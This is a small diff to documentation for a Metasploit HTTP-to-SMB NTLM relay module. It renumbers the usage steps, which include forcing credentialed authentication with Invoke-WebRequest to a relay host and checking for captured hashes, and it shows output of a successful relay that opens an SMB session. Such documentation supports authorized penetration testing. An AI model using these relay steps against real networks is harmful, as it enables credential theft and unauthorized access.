@@ -38,8 +38,8 @@ A value of `0` means signing is not required and the relay can succeed.
 3. Set the `RHOSTS` options
 4. Run the module
 5. Send an authentication attempt to the relay server
-   6. `Invoke-WebRequest -Uri http://192.0.2.1/test -UseDefaultCredentials`
-7. Check the output for successful relays and captured hashes
+   - `Invoke-WebRequest -Uri http://192.0.2.1/test -UseDefaultCredentials`
+6. Check the output for successful relays and captured hashes
 
 ## Scenarios
 ### Relaying to a single SMB server
@@ -125,5 +125,4 @@ msf auxiliary(server/relay/http_to_smb) >
 [+] Relay succeeded
 [*] SMB session 4 opened (172.16.199.1:51231 -> 172.16.199.200:445) at 2026-06-29 11:06:39 -0700
 [*] Target list exhausted for 172.16.199.130. Closing connection.
-
 ```
